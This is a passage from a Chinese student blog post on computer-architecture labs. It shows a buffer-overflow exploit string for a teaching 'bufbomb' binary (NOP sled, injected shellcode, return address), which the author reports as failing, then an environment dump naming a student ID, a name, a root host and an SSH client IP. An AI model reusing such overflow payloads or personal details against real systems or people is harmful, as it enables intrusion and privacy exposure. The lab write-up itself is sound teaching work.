%eax</span><br><span class="line">movl 0x18(%esp), %ebp</span><br><span class="line">pushl $0x08048d21</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>同时在<code>push %eax</code>语句处打断点，%eax中存着输入字符串的存储起始位置：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210505084134543.png"></p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>55 68 2e 08</td><td>55 68 2e 48</td><td>55 68 2d 98</td><td>55 68 2d c8</td><td>55 68 2e 18</td></tr></tbody></table><p><img src="/2021/computer-architecture-hitlabs/image-20210505095124477.png" alt="image-20210505095124477"></p><p>字符串长度为0x208+4+4=524个子节，前面用90(nop指令)填充，接着为攻击代码，覆盖ebp，最后是跳转地址，从每次的输入字符串起始位置中选出最大的作为跳转地址。</p><p>由此得到字符串：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line">b8 <span class="number">48</span> <span class="number">3</span>e e9 <span class="number">25</span> <span class="number">8</span>b <span class="number">6</span>c <span class="number">24</span> <span class="number">18</span> <span class="number">68</span> <span class="number">21</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">08</span> c3   # 恶意代码</span><br><span class="line"><span class="number">48</span> <span class="number">2</span>e <span class="number">68</span> <span class="number">55</span>   # 跳转地址小端表示</span><br></pre></td></tr></table></figure><p>但出现了异常：</p><blockquote><p><img src="/2021/computer-architecture-hitlabs/image-20210505094839984.png" alt="image-20210505094839984"></p><p>原因：</p><p>由testn可知，调用getbufn前后uniqueval的返回值要保持不变，否则会引发sabotaged异常。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210505095543967.png" alt="image-20210505095543967"></p><p>模拟C代码为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> val;</span><br><span class="line"> <span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</span><br><span class="line"> val = getbufn();</span><br><span class="line"> <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;KABOOM!: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line">     validate(<span class="number">4</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbufn returned 0x%x\n&quot;</span>, val);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知是字符串将uniqueval存在栈中的值给破坏了/函数行为被改变。</p><p>未解决。</p></blockquote><p>未完待续。</p><h1 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h1><p>执行<code>./LinkAddress -u 1190200215 喻灿红</code>后：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">env     <span class="number">0x7ffdf24654f0</span>  <span class="number">140728668148976</span></span><br><span class="line">env[<span class="number">0</span>]  *env    <span class="number">0x7ffdf2467648</span>  <span class="number">140728668157512</span></span><br><span class="line">XDG_SESSION_ID=<span class="number">8719</span></span><br><span class="line">env[<span class="number">1</span>]  *env    <span class="number">0x7ffdf246765c</span>  <span class="number">140728668157532</span></span><br><span class="line">HOSTNAME=iZbp1hzujytkmx0eqfmgsuZ</span><br><span class="line">env[<span class="number">2</span>]  *env    <span class="number">0x7ffdf246767d</span>  <span class="number">140728668157565</span></span><br><span class="line">TERM=xterm<span class="number">-256</span>color</span><br><span class="line">env[<span class="number">3</span>]  *env    <span class="number">0x7ffdf2467691</span>  <span class="number">140728668157585</span></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">env[<span class="number">4</span>]  *env    <span class="number">0x7ffdf24676a1</span>  <span class="number">140728668157601</span></span><br><span class="line">HISTSIZE=<span class="number">1000</span></span><br><span class="line">env[<span class="number">5</span>]  *env    <span class="number">0x7ffdf24676af</span>  <span class="number">140728668157615</span></span><br><span class="line">SSH_CLIENT=<span class="number">111.40</span><span class="number">.58</span><span class="number">.130</span> <span class="number">20088</span> <span class="number">22</span></span><br><span class="line">env[<span class="number">6</span>]  *env    <span class="number">0x7ffdf24676d1</span>  <span class="number">140728668157649</span></span><br><span class="line">OLDPWD=/root/code</span><br><span class="line">env[<span class="number">7</span>]  *env    <span class="number">0x7ffdf24676e3</span>  <span class="number">140728668157667</span></span><br><span class="line">SSH_TTY=/dev/pts/<span class="number">0</span></span><br><span class="line">env[<span class="number">8</span>]  *env    <span class="number">0x7ffdf24676f6</span>  <span class="number">140728668157686</span></span><br><span class="line">USER=root</span><br><span class="line">env[<span class="number">9</span>]  *env    <span class="number">0x7ffdf2467700</span>  <span class="number">140728668157696</span></span><br><span class="line">LD_LIBRARY_PATH=/usr/local/gcc<span class="number">-3.4</span><span class="number">.3</span>/lib:</span><br><span class="line">env[<span class="number">10</span>] *env    <span class="number">0x7ffdf246772a</span>  <span class="number">140728668157738</span></span><br><span class="line">LS_COLORS=rs=<span class="number">0</span>:di=<span class="number">38</span>;<span class="number">5</span>;<span class="number">27</span>:ln=<span class="number">38</span>;<span class="number">5</span>;<span class="number">51</span>:mh=<span class="number">44</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">15</span>:pi=<span class="number">40</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">11</span>:so=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:<span class="keyword">do</span>=<span class="number">38</span>;<span class="number">5</span>;<span class="number">5</span>:bd=<span class="number">48</span>;<span class="number">5</span>;<span class="number">232</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">11</span>:cd=<span class="number">48</span>;<span class="number">5</span>;<span class="number">232</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">3</span>:<span class="keyword">or</span>=<span class="number">48</span>;<span class="number">5</span>;<span class="number">232</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:mi=<span class="number">05</span>;<span class="number">48</span>;<span class="number">5</span>;<span class="number">232</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">15</span>:su=<span class="number">48</span>;<span class="number">5</span>;<span class="number">196</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">15</span>:sg=<span class="number">48</span>;<span class="number">5</span>;<span class="number">11</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">16</span>:ca=<span class="number">48</span>;<span class="number">5</span>;<span class="number">196</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">226</span>:tw=<span class="number">48</span>;<span class="number">5</span>;<span class="number">10</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">16</span>:ow=<span class="number">48</span>;<span class="number">5</span>;<span class="number">10</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">21</span>:st=<span class="number">48</span>;<span class="number">5</span>;<span class="number">21</span>;<span class="number">38</span>;<span class="number">5</span>;<span class="number">15</span>:ex=<span class="number">38</span>;<span class="number">5</span>;<span class="number">34</span>:*.tar=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tgz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.arc=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.arj=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.taz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lha=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lz4=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lzh=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lzma=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tlz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.txz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tzo=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.t7z=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.zip=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.z=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.Z=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.dz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.gz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lrz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.lzo=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.xz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.bz2=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.bz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tbz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tbz2=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.tz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.deb=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.rpm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.jar=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.war=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.ear=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.sar=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.rar=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.alz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.ace=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.zoo=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.cpio=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*<span class="number">.7</span>z=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.rz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.cab=<span class="number">38</span>;<span class="number">5</span>;<span class="number">9</span>:*.jpg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.jpeg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.gif=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.bmp=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.pbm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.pgm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.ppm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.tga=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.xbm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.xpm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.tif=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.tiff=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.png=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.svg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.svgz=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mng=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.pcx=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mov=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mpg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mpeg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.m2v=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mkv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.webm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.ogm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mp4=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.m4v=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.mp4v=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.vob=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.qt=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.nuv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.wmv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.asf=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.rm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.rmvb=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.flc=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.avi=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.fli=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.flv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.gl=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.dl=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.xcf=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.xwd=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.yuv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.cgm=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.emf=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.axv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.anx=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.ogv=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.ogx=<span class="number">38</span>;<span class="number">5</span>;<span class="number">13</span>:*.aac=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.au=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.flac=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.mid=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.midi=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.mka=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.mp3=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.mpc=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.ogg=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.ra=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.wav=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.axa=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.oga=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.spx=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:*.xspf=<span class="number">38</span>;<span class="number">5</span>;<span class="number">45</span>:</span><br><span class="line">env[<span class="number">11</span>] *env    <span class="number">0x7ffdf2467de2</span>  <span class="number">140728668159458</span></span><br><span class="line">MAVEN_HOME=/opt/maven/apache-maven<span class="number">-3.6</span><span class="number">.3</span></span><br><span class="line">env[<span class="number">12</span>] *env    <span class="number">0x7ffdf2467e0b</span>  <span class="number">140728668159499</span></span><br><span class="line">MAIL=/var/spool/mail/root</span><br><span class="line">env[<span class="number">13</span>] *env    <span class="number">0x7ffdf2467e25</span>  <span class="number">140728668159525</span></span><br><span class="line">PATH=/opt/maven/apache-maven<span 